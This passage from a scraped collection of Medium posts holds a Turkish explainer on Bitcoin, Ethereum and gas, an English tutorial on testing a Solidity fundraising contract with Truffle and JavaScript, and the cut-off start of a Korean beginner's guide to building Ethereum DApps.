yap\u0131lmas\u0131n\u0131 tercih ediyorlar, \u00e7\u00fcnk\u00fc b\u00f6ylece bireylerin ya da kurumlar\u0131n gelir ve giderlerinin denetlenmesi ve vergilendirilmesi de kolayla\u015fm\u0131\u015f oluyor. Ancak bu noktada bu g\u00fcvenilir firmalar\u0131n yozla\u015fmas\u0131, devletlerin yozla\u015fmas\u0131, yolsuzluklar\u0131n ya\u015fanmas\u0131 ya da 2008 y\u0131l\u0131ndaki krizde oldu\u011fu gibi bir \u00e7ok farkl\u0131 kurumu da beraberinde bat\u0131rmas\u0131 gibi riskler ortaya \u00e7\u0131km\u0131\u015f oluyor.\u0130\u015fte Bitcoin de tam olarak bu sorunu \u00e7\u00f6zmek i\u00e7in ortaya \u00e7\u0131k\u0131yor.Peki nas\u0131l \u00e7al\u0131\u015f\u0131yor?Diyelim ki finansal bir i\u015flem yapmak istiyorum, varsayal\u0131m kiram\u0131 \u00f6demek istiyorum. Bu durumda kiram\u0131n de\u011feri kadar bir paray\u0131 ev sahibime g\u00f6ndermem gerekiyor. B\u00f6yle bir i\u015flemin bir al\u0131c\u0131s\u0131, g\u00f6ndereni ve para miktar\u0131 olacakt\u0131r. Bu i\u015flemin ger\u00e7ekle\u015fmesi ile de g\u00f6nderenin hesab\u0131ndan para azal\u0131rken, al\u0131c\u0131n\u0131n hesab\u0131nda da ayn\u0131 oranda bir para giri\u015finin ger\u00e7ekle\u015fmesi gerekir.Bunun ger\u00e7ekle\u015fmesi i\u00e7in i\u015flemi yapan ki\u015fi gerekli bilgileri doldurduktan sonra bir i\u015flem giri\u015fi yarat\u0131p bunu Bitcoin a\u011f\u0131na g\u00f6nderir. Bitcoin a\u011f\u0131 dedi\u011fimiz \u015fey asl\u0131nda bu sisteme ba\u011fl\u0131 olan istemci bilgisayarlardan olu\u015fmaktad\u0131r. A\u011fa dahil olan her bilgisayar kendisine yak\u0131n olan ba\u015fka istemcilerle ileti\u015fime ge\u00e7erek Peer-to-peer bir \u015fekilde kar\u015f\u0131l\u0131kl\u0131 veri al\u0131\u015fveri\u015fine ba\u015flarlar ve otomatik olarak a\u011f i\u00e7erisinde 2009 y\u0131l\u0131ndan bu yana yap\u0131lm\u0131\u015f olan b\u00fct\u00fcn i\u015flemleri kendi disklerine indirmeye ba\u015flarlar, yani a\u011f ile senkronize olmaya ba\u015flarlar. Evet, tarih boyunca yap\u0131lm\u0131\u015f t\u00fcm i\u015flemlerin listesi \u015feffaf bir \u015fekilde herkesin eri\u015fimine a\u00e7\u0131k durmaktad\u0131r. Hatta baz\u0131 web sitelerinden \u015fu anda yap\u0131lan i\u015flemleri canl\u0131 olarak g\u00f6rmeniz bile m\u00fcmk\u00fcn (cointicker). \u015eeffafl\u0131k konusuna birazdan geri d\u00f6nece\u011fim i\u00e7in \u015fu anda bunun ne kadar \u00f6nemli bir \u015fey oldu\u011fundan bahsetmiyorum. Birazc\u0131k sabredin l\u00fctfen!Biz \u00f6rne\u011fimize d\u00f6nelim, kira \u00f6deme i\u015flemini a\u011fdaki di\u011fer bilgisayarlarla payla\u015f\u0131yorduk de\u011fil mi? Evet! Onlar da ayn\u0131 \u015fekilde ba\u015fka bilgisayarlarla birebir olarak ba\u011fl\u0131 olduklar\u0131 i\u00e7in onlar da elden ele y\u00f6ntemi ile bu i\u015flemi onlarla payla\u015f\u0131yorlar. Burada dikkat edilmesi gereken konu \u015fu; olu\u015fturdu\u011funuz i\u015flem hen\u00fcz onaylanmad\u0131. Yani hesab\u0131n\u0131zdan hen\u00fcz para transferi ger\u00e7ekle\u015fmedi. Onay bekliyor diyebiliriz.Ayn\u0131 anda sistemde madenci denilen ba\u015fka insanlar da zor bir matematiksel problemi \u00e7\u00f6zmeye \u00e7al\u0131\u015f\u0131yorlar. Bu problemin \u00e7\u00f6z\u00fcm\u00fc \u00e7ok fazla i\u015flemci g\u00fcc\u00fc gerektirdi\u011fi i\u00e7in kolayl\u0131kla herkes taraf\u0131ndan \u00e7\u00f6z\u00fclemiyor. Hatta bu problemin \u00e7\u00f6z\u00fcm\u00fc de g\u00fcn ge\u00e7tik\u00e7e zorla\u015f\u0131yor. Bu problem \u00e7\u00f6z\u00fcld\u00fc\u011f\u00fcnde, problemi \u00e7\u00f6zen ki\u015fi bir blockchain olu\u015fturup hen\u00fcz onaylanmam\u0131\u015f i\u015flemleri bu blockchain i\u00e7ine ekliyorlar ve bu noktada i\u015fleminiz onaylan\u0131yor ve kar\u015f\u0131l\u0131kl\u0131 para transferleri ger\u00e7ekle\u015fiyor. Bu problemi \u00e7\u00f6zen ve blockchain olu\u015fturan ki\u015fi de yapt\u0131\u011f\u0131 i\u015flem kar\u015f\u0131s\u0131nda 1 bitcoin ile \u00f6d\u00fcllendiriliyor.Blockchain yani blok zinciri, ayn\u0131 bir Linked List gibi kendisinden \u00f6ncekini biliyor, yani kendisinden \u00f6nceki blok ile zincirleniyor. B\u00f6ylelikle son zinciri bilirseniz tarihin en ba\u015f\u0131na kadar gidebiliyorsunuz. Ancak iyi haber; bu i\u015flemlerin g\u00f6ndereni ve kabul edeni k\u0131s\u0131mlar\u0131nda isim de\u011fil anonim adresler yaz\u0131yor. Yani i\u015flemleri g\u00f6r\u00fcyorsunuz ancak bu i\u015flemleri kim neden yapm\u0131\u015f takip etmeniz m\u00fcmk\u00fcn de\u011fil. Bu noktada tart\u0131\u015fmak istedi\u011fim \u00e7ok fazla konu var \u00f6rne\u011fin bu sistemin zafiyetleri yok mu? E madem zor bir problem bu, o zaman bir de ben onun \u00e7\u00f6z\u00fclmesini mi bekleyece\u011fim? Ben \u2018proof of work\u2019 diye bir \u015fey duydum o neydi? gibi. Ancak yaz\u0131n\u0131n amac\u0131ndan sapmamas\u0131 i\u00e7in burada duruyorum, aksilik \u00e7\u0131kmazsa ileride yazaca\u011f\u0131m yaz\u0131larda ya da video kay\u0131tlar\u0131nda bunlara de\u011finece\u011fim.Ethereum diyorduk sen bize ne anlat\u0131yorsun!Durun durun geliyorum oraya. En ba\u015fta Bitcoin ile Ethereum\u2019un \u00e7ok benzedi\u011finden bahsetmi\u015ftim, e\u011fer bunun nas\u0131l \u00e7al\u0131\u015ft\u0131\u011f\u0131n\u0131 anlatmasayd\u0131m bundan sonra s\u00f6yleyeceklerimi anlatmak \u00e7ok zor olurdu. Yukar\u0131da \u00e7ok kabaca blockchain\u2019in ne oldu\u011fundan ve sistemin transparan \u00e7al\u0131\u015ft\u0131\u011f\u0131ndan bahsetmeye \u00e7al\u0131\u015ft\u0131m. Burada odaklanman\u0131z\u0131 istedi\u011fim bir ka\u00e7 konu var, t\u00fcm i\u015flemler \u015feffaf bir \u015fekilde herkesle payla\u015f\u0131yor ve sizin i\u015fleminizi sizin tan\u0131mad\u0131\u011f\u0131n\u0131z birisi onayl\u0131yor ve herkesle payla\u015f\u0131yor.\u0130\u015fte bu sistemin en b\u00fcy\u00fck getirisi ortada merkezi bir arac\u0131 yok. Yani devletler bu sistemi engelleyemiyor ve denetleyemiyor. Ancak kimsenin denetlemesine gerek kalmadan bu sistem transparanl\u0131\u011f\u0131 ve anonimli\u011fi sayesinde g\u00fcvene ihtiya\u00e7 duymadan sorunsuz bir \u015fekilde \u00e7al\u0131\u015f\u0131yor. Bu gibi uygulamalara \u2018Trustless\u2019 uygulamalar da deniyor. Yani g\u00fcvene ihtiya\u00e7 duymadan i\u015flemlerini ger\u00e7ekle\u015ftirebiliyorsun.Ethereum da bu sistemin neredeyse t\u00fcm \u00f6zelliklerini bar\u0131nd\u0131r\u0131yor ve \u00fczerine yeni bir \u00e7ok \u015fey ekliyor. Belki de en \u00f6nemli fark\u0131 sundu\u011fu \u2018Ak\u0131ll\u0131 Kontratlar\u2019.Yeter art\u0131k! Nedir yahu bu Ethereum?Ethereum, a\u00e7\u0131k kaynak kodlu ve herkesin kullan\u0131m\u0131na a\u00e7\u0131k blockchain teknolojisini kullanan \u2018merkezi olmayan\u2019 (Decentralized) bir uygulama \u00e7al\u0131\u015ft\u0131rma platformu. \u0130lk defa 2013 y\u0131l\u0131nda Vitalik Buterin ad\u0131nda bir yaz\u0131l\u0131mc\u0131 taraf\u0131ndan ortaya at\u0131l\u0131yor ve 2015 y\u0131l\u0131nda canl\u0131 bir sistem olarak hayata ge\u00e7iyor. \u015eu anda hala daha Ethereum kom\u00fcnitesi taraf\u0131ndan geli\u015ftirilmeye ve desteklenmeye devam ediyor. Ethereum sisteminin para birimi \u2018Ether\u2019 (ETH). \u015eu anda de\u011feri 326 dolar civar\u0131nda ancak \u00e7ok de\u011fi\u015fken seyrediyor, dolay\u0131s\u0131yla yat\u0131r\u0131m ama\u00e7l\u0131 bak\u0131ld\u0131\u011f\u0131nda epey riskli. Ancak benim ilgilendi\u011fim k\u0131sm\u0131 bu de\u011fil.Bu sistemin Bitcoin\u2019den en b\u00fcy\u00fck fark\u0131 az \u00f6nce s\u00f6yledi\u011fim gibi \u2018Smart Contract\u2019 yani ak\u0131ll\u0131 kontratlar. Bu platform EVM (Ethereum Virtual Machine) denilen bir VM sayesinde Solidity ad\u0131ndaki dili kullanarak yazd\u0131\u011f\u0131n\u0131z uygulamalar\u0131 da\u011f\u0131t\u0131k bir \u015fekilde \u00e7al\u0131\u015ft\u0131rman\u0131za olanak sa\u011fl\u0131yor. Yani kar\u015f\u0131l\u0131kl\u0131 bir i\u015flem ger\u00e7ekle\u015ftirmek istedi\u011finizde Bitcoin\u2019de oldu\u011fu gibi basit i\u015flemler yapabilmenize ek olarak bir de bu i\u015flemleri belirli kurallarla programlamaniza olanak sa\u011fl\u0131yor.Diyelim ki birisine internet \u00fczerinden \u00fcr\u00fcn sat\u0131\u015f\u0131 yapmak istiyorsunuz. \u015eu anda ebay gibi siteler al\u0131c\u0131 ve sat\u0131c\u0131 aras\u0131nda arac\u0131 olarak bir g\u00fcvence sa\u011fl\u0131yorlar. Yani \u00fcr\u00fcn gelmeden paray\u0131, para gelmeden de \u00fcr\u00fcn\u00fc de\u011fi\u015f-toku\u015f yapm\u0131yorsunuz. E\u011fer al\u0131c\u0131 belli bir s\u00fcre i\u00e7erisinde \u00fcr\u00fcn\u00fcn ula\u015fmad\u0131\u011f\u0131n\u0131 bildirmezse para sat\u0131c\u0131n\u0131n hesab\u0131na ge\u00e7iyor. Ancak aradaki arac\u0131 da bu i\u015flemden belli bir miktar komisyon al\u0131yor. \u0130\u015fte bu gibi i\u015flemleri Ethereum \u00fczerinde Solidity dilini kullanarak bir ak\u0131ll\u0131 kontrata kodlay\u0131p bu i\u015flemlerin bir arac\u0131 ile de\u011fil bu a\u011f \u00fczerinde yap\u0131lmas\u0131n\u0131 sa\u011flayabilir ve aradaki arac\u0131y\u0131 (middle man) ortadan kald\u0131r\u0131p ald\u0131\u011f\u0131 komisyondan \u00e7ok daha ucuza halledebilirdiniz. Tabi bunun gibi bir \u00e7ok kullan\u0131m alan\u0131n\u0131 \u00f6rneklemek m\u00fcmk\u00fcn.Peki nas\u0131l \u00e7al\u0131\u015f\u0131yor bu\u00a0sistem?Bunu konu\u015fmadan \u00f6nce basit bir iki temel bilgiyi vermek gerekiyor.Ethereum a\u011f\u0131 i\u00e7erisinde durum yani \u0130ngilizce\u2019si ile \u2018state\u2019 hesaplarla (Account) saklan\u0131yor. Her bir hesap 20-byte\u2019l\u0131k bir adrese sahip ve i\u015flemler yani transaction\u2019lar bu 20-byte\u2019l\u0131k adresler aras\u0131nda ger\u00e7ekle\u015fiyor. Bir hesap nesnesinin bir ka\u00e7 \u00f6zelli\u011fi var;\u0130\u015flemlerin sadece bir kere ger\u00e7ekle\u015fmesini sa\u011flamak i\u00e7in tutulan bir saya\u00e7 de\u011feri; nonce.Hesaptaki Ether miktar\u0131E\u011fer mevcutsa, kontrata ait \u00e7al\u0131\u015ft\u0131r\u0131labilir kod par\u00e7as\u0131.Hesaba ait saklanan veri.Yukar\u0131daki alanlardan e\u011fer sadece Ether miktar\u0131 mevcutsa bu hesap bir dijital c\u00fczdan gibi davran\u0131rken, buna bir kod par\u00e7as\u0131 ekledi\u011finizde bir ak\u0131ll\u0131 kontrata d\u00f6n\u00fc\u015f\u00fcyor. Bu kontratlar da a\u011fa \u2018deploy\u2019 ediliyorlar. Kontratlar\u0131n kodlar\u0131 daha \u00f6nce de bahsetti\u011fim gibi, Solidity denilen bir dil ile yaz\u0131l\u0131yor. Bu yaz\u0131da buna odaklanmayaca\u011f\u0131m ancak bu dil ile ilgili bilgi almak istiyorsan\u0131z daha \u00f6nceden kaydetti\u011fim Solidity 101 video\u2019sunu izleyebilirsiniz. Yak\u0131nda daha ileri seviye video\u2019lar da Codefiction Youtube kanal\u0131ndan yay\u0131nlanacak.Ethereum a\u011f\u0131 i\u00e7erisindeki kontratlar sistem i\u00e7erisinde s\u00fcrekli ya\u015fayan nesneler. Yani siz bir kontrat olu\u015fturup bunu bir program gibi istedi\u011finiz zaman \u00fczerine tan\u0131mlad\u0131\u011f\u0131n\u0131z fonksiyonlar\u0131n\u0131 \u00e7al\u0131\u015ft\u0131rabilirsiniz. Mesela Solidity 101 video\u2019sunda anlatt\u0131\u011f\u0131m gibi ba\u015fkalar\u0131yla payla\u015fabilece\u011finiz ortak bir banka hesab\u0131 yarat\u0131p istedi\u011finiz zaman buraya g\u00fcvenilir bir \u015fekilde Ether aktarabilir ya da \u00e7ekebilirsiniz. Yapaca\u011f\u0131n\u0131z her i\u015flem bir ba\u015fkas\u0131 taraf\u0131ndan \u00e7al\u0131\u015ft\u0131r\u0131laca\u011f\u0131 i\u00e7in, \u00e7al\u0131\u015ft\u0131r\u0131lacak kodun ad\u0131m say\u0131s\u0131na ba\u011fl\u0131 olarak, belli bir miktar \u00fccret de \u00f6demeniz gerekecektir. Yani e\u011fer \u00e7al\u0131\u015ft\u0131r\u0131lacak fonksiyon \u00e7ok fazla ad\u0131mdan olu\u015fuyorsa \u00f6demeniz gereken \u00fccret de buna ba\u011fl\u0131 olarak artacakt\u0131r. Demem o ki, e\u011fer optimize bir algoritma \u00e7al\u0131\u015ft\u0131r\u0131yorsan\u0131z daha az maliyetiniz olacakt\u0131r. (Asymptotic Computational Complexity)Bir adrese para g\u00f6ndermek ya da bir adresteki kontrat\u0131n bir fonksiyonunu \u00e7a\u011f\u0131rarak bir i\u015flem ger\u00e7ekle\u015ftirmek gibi operasyonlara \u2018transaction\u2019 deniliyor. Anlam kaybolmas\u0131ndan korktu\u011fum i\u00e7in ne yaz\u0131k ki bundan sonra hep \u0130ngilizce terimleri kullanmaya ba\u015flayaca\u011f\u0131m. Transaction\u2019lar Ethereum a\u011f\u0131nda bir adresten tetiklenen imzalanm\u0131\u015f veri paketleri, yani mesajlar. Bu mesajlar i\u00e7erilerinde \u015funlar\u0131 bar\u0131nd\u0131r\u0131yorlar;Mesaj\u0131n al\u0131c\u0131s\u0131,G\u00f6ndereni tan\u0131mlayan bir dijital imza,Al\u0131c\u0131ya iletilecek Ether miktar\u0131,Hesaplarda oldu\u011fu gibi, opsiyonel bir veri saklama alan\u0131,EVM taraf\u0131ndan hesaplanan olas\u0131 maksimum i\u015flem ad\u0131m\u0131na ba\u011fl\u0131 olarak hesaplanan STARTGAS de\u011feri. Bu de\u011fer ilgili mesaj\u0131n \u00e7al\u0131\u015fmas\u0131 sonucunda ortaya \u00e7\u0131kabilecek maksimum maliyete kar\u015f\u0131l\u0131k geliyor. Ancak bu tabi ki sizin i\u015fleminizin bu kadara mal olaca\u011f\u0131 anlam\u0131na gelmiyor.G\u00f6nderen taraf\u0131ndan \u00f6denecek olan Ether miktar\u0131n\u0131 belirleyen GASPRICEBuradaki alanlardan ilk 4 tanesi Bitcoin ile ayn\u0131 \u00f6zellikleri ta\u015f\u0131yor. Ancak fark yaratan k\u0131sm\u0131 geriye kalan son iki alan. Bu alanlar Ethereum a\u011f\u0131na DOS sald\u0131r\u0131s\u0131 yap\u0131lmas\u0131n\u0131 engellemek i\u00e7in eklenmi\u015f alanlar. Yani k\u00f6t\u00fc niyetli birisinin sonsuz d\u00f6ng\u00fcye giren bir kontrat y\u00fckleyip bir madenciyi a\u011fdan d\u00fc\u015f\u00fcrmesini engellemek i\u00e7in kullan\u0131l\u0131yor. E\u011fer b\u00f6yle bir \u015fey denenirse \u00f6demesi gereken miktar \u00e7ok fazla olaca\u011f\u0131 i\u00e7in k\u00f6t\u00fc niyetli ki\u015fileri cayd\u0131r\u0131yor.GAS denilen birim ise her i\u015flem ad\u0131m\u0131na g\u00f6re hesaplan\u0131yor. Yani e\u011fer bir kontrat\u0131n bir sonraki halinde \u00e7ok fazla veri olu\u015fturulursa bu durumda \u00f6denmesi gereken GAS miktar\u0131 da ona oranla art\u0131yor. Bu GAS de\u011feri de i\u015flemi \u00e7al\u0131\u015ft\u0131ran madenciye o anda i\u015flemci g\u00fcc\u00fcn\u00fc kulland\u0131\u011f\u0131 i\u00e7in \u00f6d\u00fcl olarak g\u00f6nderiliyor. \u00d6rne\u011fin bir ak\u0131ll\u0131 kontrat\u0131n bir hesap yap\u0131p ya da kural \u00e7al\u0131\u015ft\u0131r\u0131p Ether ya da bir token transferi yapmas\u0131 yeni bir kontrat durumu yani \u2018state\u2019 olu\u015fturaca\u011f\u0131 i\u00e7in bunun i\u00e7in belli bir miktar GAS \u00f6demesi gerekirken mevcut bir kontrat\u0131n o andaki durumunun okunmas\u0131 yeni bir \u2018state\u2019 olu\u015fturmayaca\u011f\u0131 i\u00e7in \u00fccretsiz ger\u00e7ekle\u015febiliyor.", "responses": "5"}, {"title": "Testing Your Smart Contracts With JavaScript (Including Async/Await Promises)", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://medium.com/@gus_tavo_guim/testing-your-smart-contracts-with-javascript-40d4edc2abed?source=search_post", "post_date": "Oct 20, 2017", "readtime": "5 min read", "upvotes": "814", "content": "Testing Your Smart Contracts With JavaScript (Including Async/Await Promises)Gustavo (Gus) GuimaraesBlockedUnblockFollowFollowingOct 20, 2017[ The code for this blog post can be found here: https://github.com/gustavoguimaraes/smart-contract-testing-javascript-example-]Smart contract developers strive to mitigate bugs in their code as they can be literally costly. For this end, one of the techniques we use is to write tests extensively or dare I say obsessively to the codebase.In this post I will show you how to start testing your smart contracts from the get go.Show me the green light to move\u00a0forwardFirst off, these are the dependencies I used to create this tutorial. If you come across an error, you can try installing and using these versions.- node@8.5.0- truffle@^4.0.0- ethereumjs-testrpc@^4.0.1With the dependencies out of the way, let\u2019s set up the project.mkdir smart-contract-test-example && cd \"$_\" && truffle init webpackThe snippet above creates a directory, changes into it and initializes Truffle with webpack.Now create the test file for the FundRaise smart contract we\u2019ll build.touch test/fundRaise.jsOpen the file in your favorite text editor and add the most basic test structure.const FundRaise = artifacts.require('./FundRaise.sol')contract('FundRaise', function () {})They first line fetches the contract artifacts. It is the contract abstraction containing its primary information i.e. its ABI, address and the like.Then we create the function contract() which is similar to the describe() function in Mocha, except that Truffle adds some features such as making sure the contracts are deployed before running the tests. By the way, Truffle uses the Mocha testing framework as well as Chai assertion library under the hood.Now let\u2019s run this barebones test.First:testrpcThen open a new command line window and typetruffle test test/fundRaise.jsThe outcome is:Error: Could not find artifacts for ./FundRaise.sol from any sources    at Resolver.require (/usr/local/lib/node_modules/truffle/build/cli.bundled.js:49072:9)    at TestResolver.require (/usr/local/lib/node_modules/truffle/build/cli.bundled.js:89733:30)...This is because we haven\u2019t coded up the FundRaise smart contract just yet. Let\u2019s fix this.touch contracts/FundRaise.solThen add the codepragma solidity ^0.4.17;contract FundRaise {}Run the test again: 0 passing (1ms)Right. No tests written yet.Smart Contract Specification and Adding TestsThe FundRaise smart contract will be a simple contract. Its straightforward specification is:it has an ownerit accepts fundsit is able to pause and un-pause the fundraising activitycontract owner is able to remove funds from the contract to herself at any time.Let\u2019s start with the first specification\u200a\u2014\u200athe contract has a ownerconst FundRaise = artifacts.require('./FundRaise.sol')contract('FundRaise', function ([owner]) {    let fundRaise    beforeEach('setup contract for each test', async function () {        fundRaise = await FundRaise.new(owner)    })    it('has an owner', async function () {        assert.equal(await fundRaise.owner(), owner)    })})In the test code above we accomplish a few things.1- fancy ES2015 destructuring variable assignment in function([owner] the first parameter given to the contract function is an array with the accounts\u00a0coming\u00a0from\u00a0testrpc. We are taking the first one and assigning it the variable owner\u00a0.2- create the fundRaise variable3- have a beforeEach function which will run before each test creating a new instance of fundRaise each time. Note the use of async/await for promises. This allows for more readable test code. If you want to read up more on the new JavaScript async/await features, this is a good blog post on it.4- create the first test within the it() function block. Here we are asserting that the fundRaise.owner() is the owner that we passed to when creating the contract.Before running the tests once more, head over to truffle.js and require babel-polyfill as we need it to use async/await.truffle.js// Allows us to use ES6 in our migrations and tests.require('babel-register')require('babel-polyfill')module.exports = {  networks: {    development: {      host: 'localhost',      port: 8545,      network_id: '*' // Match any network id    }  }}Run the tests again and you will find this error:...1 failing1) Contract: FundRaise has an owner:     AssertionError: expected undefined to equal '0x676c48fb3979cf2e47300e8ce80a99087589650d'...Now it is time to write the code that will make the first test pass. Let\u2019s flesh out our smart contract a bit.pragma solidity ^0.4.17;contract FundRaise {    address public owner;    // @dev constructor function. Sets contract owner     function FundRaise() {        owner = msg.sender;    }}Trigger the test again, i.e.truffle test test/fundRaise.js\u00a0:Contract: FundRaise    \u2713 has an owner (41ms)1 passing (138ms)Great! Let\u2019s move on and add the next one.const FundRaise = artifacts.require('./FundRaise.sol')  contract('FundRaise', function ([owner, donor]) {    let fundRaise    beforeEach('setup contract for each test', async function () {      fundRaise = await FundRaise.new(owner)    })    it('has an owner', async function () {      assert.equal(await fundRaise.owner(), owner)    })    it('is able to accept funds', async function () {      await fundRaise.sendTransaction({ value: 1e+18, from: donor })      const fundRaiseAddress = await fundRaise.address      assert.equal(web3.eth.getBalance(fundRaiseAddress).toNumber(), 1e+18)    })})The error this time is:1 failing1) Contract: FundRaise is able to accept funds:     Error: VM Exception while processing transaction: invalid opcodeRight, we need to let our contract receive Ether. Let\u2019s fix that.pragma solidity ^0.4.17;contract FundRaise {    address public owner;// @dev constructor function. Sets contract owner     function FundRaise() {        owner = msg.sender;    }        // fallback function that allows contract to accept ETH     function () payable {}}And the result is:Contract: FundRaise    \u2713 has an owner (38ms)    \u2713 is able to accept funds (234ms)2 passing (473ms)Beautiful. This is the process one goes through systematically to cover the smart contracts with test\u00a0written\u00a0in\u00a0JavaScript. Just keep doing this process until all smart contract specifications are met.For simplicity sake, I am going to fast forward the process and add the complete set of tests for the FundRaise contract so you have an idea how it would look like in the end.Note the tests for the pause/unpause and owner receive funds testsand here is the full code for the smart contract:Run the tests one last time\u2026Contract: FundRaise    \u2713 has an owner (46ms)    \u2713 accepts funds (193ms)    \u2713 is able to pause and unpause fund activity (436ms)    \u2713 permits owner to remove funds (653ms)4 passing (2s)Marvelous!Hope you learned a thing or two about testing smart contracts with JavaScript and its use in blockchain development. Now carry on and keep testing the heck out of your smart contracts.The code for this blog post can be found here: https://github.com/gustavoguimaraes/smart-contract-testing-javascript-example-", "responses": "5"}, {"title": "\ucd08\ubcf4\uc790\ub4e4\uc744 \uc704\ud55c \uc774\ub354\ub9ac\uc6c0 DApp\u00a0\ub9cc\ub4e4\uae30", "author_name": "Teckle", "link": "https://medium.com/@weekly.teckle/%EC%B4%88%EB%B3%B4%EC%9E%90%EB%93%A4%EC%9D%84-%EC%9C%84%ED%95%9C-%EC%9D%B4%EB%8D%94%EB%A6%AC%EC%9B%80-dapp-%EB%A7%8C%EB%93%A4%EA%B8%B0-c6ddb0c6651d?source=search_post", "post_date": "Apr 30, 2018", "readtime": "15 min read", "upvotes": "568", "content": "\ucd08\ubcf4\uc790\ub4e4\uc744 \uc704\ud55c \uc774\ub354\ub9ac\uc6c0 DApp\u00a0\ub9cc\ub4e4\uae30TeckleBlockedUnblockFollowFollowingApr 30, 2018About Teckle (Technology + Tackle = Teckle)Teckle\uc740 \u201c\uc5b4\ub824\uc6b4 \uae30\uc220\uc744 \ud655\uace0\ud788, \ud6a8\uc728\uc801\uc73c\ub85c \ubd84\uc11d\ud558\uc5ec, \ub9ce\uc740 \uc774\ub4e4\uc774 \uc54c \uc218 \uc788\ub3c4\ub85d \ub110\ub9ac \uc54c\ub9ac\uc790\u201d \ub77c\ub294 \ubaa9\uc801\uc744 \uac00\uc9c0\uace0 \ub9cc\ub4e4\uc5b4\uc9c4 \ube14\ub85d\uccb4\uc778 \uc2a4\ud130\ub514 \ubc0f DApp \uac1c\ubc1c \ubaa8\uc784\uc785\ub2c8\ub2e4. \ud604\uc7ac 6\uc778\uc758 \uba64\ubc84\uac00 \ud568\uaed8\ud558\uace0 \uc788\uc2b5\ub2c8\ub2e4.\ub4e4\uc5b4\uac00\uba70\uc774 \uae00\uc740 DApp\uc744 \ucc98\uc74c \uc811\ud558\ub294 \uac1c\ubc1c\uc790\ub97c \uc704\ud55c \uae00\uc785\ub2c8\ub2e4. Solidity \uc5b8\uc5b4\ub85c \uc774\ub354\ub9ac\uc6c0 \uae30\ubc18\uc758 \ud0c8\uc911\uc559\ud654\ub41c \uc560\ud50c\ub9ac\ucf00\uc774\uc158(Decetralized applications)\uc744 \ub9cc\ub4dc\ub294 \uacfc\uc815\uc744 \uc774\ud574\ud560 \uc218 \uc788\uac8c \uc37c\uc2b5\ub2c8\ub2e4.*\uae30\ucd08\uc801\uc778 \uc6f9 \uac1c\ubc1c \uc9c0\uc2dd\uc744 \ud544\uc694\ub85c \ud569\ub2c8\ub2e4.\ubaa9\ucc28:Part 1. \uac1c\ubc1c \ud750\ub984 \uc774\ud574\ud558\uae30DApp\uc774 \ubb54\uac00\uc694?Solidity\ub780?\uac1c\ubc1c \ud658\uacbd \uad6c\uc131Part 2. \uac1c\ubc1c\ubd80\ud130 \ubc30\ud3ec\uae4c\uc9c0\uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8 \uc791\uc131\ud14c\uc2a4\ud2b8\ub137 \ubc30\ud3ec\ud504\ub860\ud2b8\uc5d4\ub4dc \uc791\uc131\uba54\uc778\ub137 \ubc30\ud3ecPart1. \uac1c\ubc1c \ud750\ub984\u00a0\uc774\ud574\ud558\uae30A. DApp\uc774\u00a0\ubb54\uac00\uc694?\uba3c\uc800 DApp(Decentralized application)\uc5d0 \ub300\ud55c \uc774\ud574\ub97c \ud558\uace0 \ub118\uc5b4\uac00\uc57c\uaca0\uc8e0? DApp\uc740 \ube14\ub85d\uccb4\uc778 \uc704\uc5d0\uc11c \ub3cc\uc544\uac00\ub294 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc785\ub2c8\ub2e4. \uc544\uc774\ud3f0\uacfc \uad6c\uae00\uc774 \uac01\uac01\uc758 OS\ub85c \ud50c\ub7ab\ud3fc\uc744 \ub9cc\ub4e4\uace0 \uadf8 \uc704\uc5d0 \uc571\ub4e4\uc744 \ub9cc\ub4e4 \uc218 \uc788\ub294 \uc0dd\ud0dc\uacc4\ub97c \uc81c\uacf5\ud55c \uac83\ucc98\ub7fc, \ube14\ub85d\uccb4\uc778 \ud50c\ub7ab\ud3fc (ex. \uc774\ub354\ub9ac\uc6c0, \uc774\uc624\uc2a4, \ud000\ud140, \ub124\uc624 \ub4f1) \uc5ed\uc2dc \uadf8 \uc704\uc5d0 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc744 \ub9cc\ub4e4\uace0 \uc6b4\uc601\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4.\uadf8\ub807\ub2e4\uba74 \uc77c\ubc18 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uacfc DApp\uc758 \ucc28\uc774\uac00 \ubb50\uc57c? \ub77c\ub294 \uc758\ubb38\uc774 \ub4dc\uc2e4\ud150\ub370\uc694. \uc644\ubcbd\ud788 \ud0c8\uc911\uc559\ud654\ub41c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc740 \ub2e4\uc74c\uacfc \uac19\uc740 \ud2b9\uc131\uc744 \uac00\uc9c0\uace0 \uc788\uc2b5\ub2c8\ub2e4:\uc624\ud508 \uc18c\uc2a4 \uae30\ubc18\uc774\uba70 \uc790\uc728\uc801\uc73c\ub85c \uc6b4\uc601\ub428 (\ube14\ub85d\uccb4\uc778\uc73c\ub85c \uc6b4\uc601\ud558\ub294 \uc11c\ube44\uc2a4\ub294 \uc11c\ube44\uc2a4\uac00 \uc911\ub2e8\ub418\uac70\ub098 \uc0ac\ub77c\uc9c4\ub2e4\uace0 \ud558\ub354\ub77c\ub3c4, \ud55c \ubc88 \ubc30\ud3ec\ud558\uba74 \uc601\uc6d0\ud558\uae30 \ub54c\ubb38\uc5d0 \uacc4\uc18d\ud574\uc11c \uc0ac\uc6a9\uc774 \uac00\ub2a5)\ud37c\ube14\ub9ad \ube14\ub85d\uccb4\uc778 \uc704\uc5d0 \ub370\uc774\ud130\ub97c \uc800\uc7a5 (\ud55c\ubc88 \ube14\ub85d\uccb4\uc778 \uc704\uc5d0 \uc62c\ub77c\uac00\uba74 \ub370\uc774\ud130\ub97c \ub2e4\uc2dc \ub418\ub3cc\ub9ac\uac70\ub098 \ubcc0\ud615 \ubd88\uac00\ub2a5)\uc554\ud638\ud654\ud3d0\uc5d0 \uac00\uce58\ub97c \ubd80\uc5ec\ud568\uc54c\uace0\ub9ac\uc998 \uae30\ubc18\uc5d0 \uc758\ud55c \ud1a0\ud070 \uc0dd\uc131\uc704\uc640 \uac19\uc740 \ud2b9\uc9d5\ub54c\ubb38\uc5d0 \ub370\uc774\ud130 \uc870\uc791\uc73c\ub85c \ubd80\ud130 \uc548\uc804\ud558\uba70, \ubbfc\uc8fc\uc801\uc73c\ub85c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc744 \uc6b4\uc601\ud560 \uc218 